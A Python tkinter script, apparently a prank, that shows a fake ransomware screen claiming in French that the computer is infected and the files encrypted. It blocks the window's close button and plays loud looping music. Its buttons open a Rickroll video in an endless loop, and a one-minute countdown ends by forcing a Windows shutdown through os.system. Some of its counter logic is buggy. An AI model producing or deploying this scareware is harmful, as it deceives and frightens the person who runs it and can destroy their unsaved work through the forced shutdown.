from tkinter import *
import webbrowser
import pygame
from pygame import mixer
import time
import tkinter as tk
from pynput.keyboard import Key, Controller
import os

pygame.mixer.init()
musique = 0
keyboard = Controller()
fin = 0

#définitions
def fermer_fenetre():
    bloquer = 1

def prank():
    while True:
        webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", new=2)
        time.sleep(1)
        musique + 1

def bouton_troll():
    time.sleep(3)
    pygame.mixer.music.load("nevergonna.mp3")
    pygame.mixer.music.play(loops=1)
    mixer.music.set_volume(1)

root = tk.Tk()
root.protocol("WM_DELETE_WINDOW", fermer_fenetre)
root.minsize(750, 450)
root.maxsize(750, 450)
root.title("Votre ordinateur est infecté !")
#root.iconbitmap("terminatorico.ico")

canv = Canvas(root, width=1920, height=1080, bg='red')
canv.grid(row=0, column=0)

img = PhotoImage(file="jenaimarre.png")
canv.create_image(0, 0, anchor=NW, image=img)


pygame.mixer.music.load("musiquedefond.mp3")
pygame.mixer.music.play(loops=1000)
mixer.music.set_volume(150)


bouton_payer = Button(text="Clique ici", font=("Firestarter", 20), command=prank, width=8, bg="red", height=1)
bouton_payer.place(x=25, y=180)

bouton_propos = Button(text="A propos", font=("Firestarter", 20), command=prank, width=8, bg="red", height=1)
bouton_propos.place(x=25, y=228)

canv.create_text(380, 40,fill='red', text="Vos fichiers sont encryptés ", font=("Noticia", 30))



def start():
    global hours, minutes, seconds

    if hours == 4:
        return

    seconds -= 1

    if seconds == 00:
        minutes -= 1
        seconds = 60
        if minutes == 00:
            minutes += 0


    if minutes == 00:
        fin + 1

    if minutes == -1:
        minutes += 1
        seconds -=60

    if seconds == -1:
        seconds == 0

    if minutes == 00 and seconds == 00:
        os.system("shutdown /s /t 1")

    if fin == 1:
        os.system("shutdown /s /t 1")

    clock.config(text=f'{hours:02}:{minutes:02}:{seconds:02}')

    root.after(1000, start)

    if minutes == 00 and seconds == 00 and hours == 00:
        return


clock = tk.Label(root, height=1, background="#000000", foreground='white',
                 font=("Bold", 20), anchor=CENTER, text="00:00:00")
clock.place(x=690, y=430, anchor=CENTER)
hours, minutes, seconds = 0, 1, 1
start()


root.mainloop()